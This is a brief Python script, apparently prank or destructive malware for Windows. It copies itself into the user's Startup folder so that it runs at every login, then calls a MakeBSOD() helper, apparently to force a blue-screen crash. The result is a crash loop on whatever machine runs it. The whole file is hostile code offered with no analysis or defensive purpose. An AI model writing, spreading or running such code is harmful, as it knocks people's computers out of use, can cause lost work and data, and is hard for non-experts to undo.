from utils.functions import *
import shutil


def add_to_startup():
    file_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shutil.copy(file_path, startup_folder)
add_to_startup()


MakeBSOD()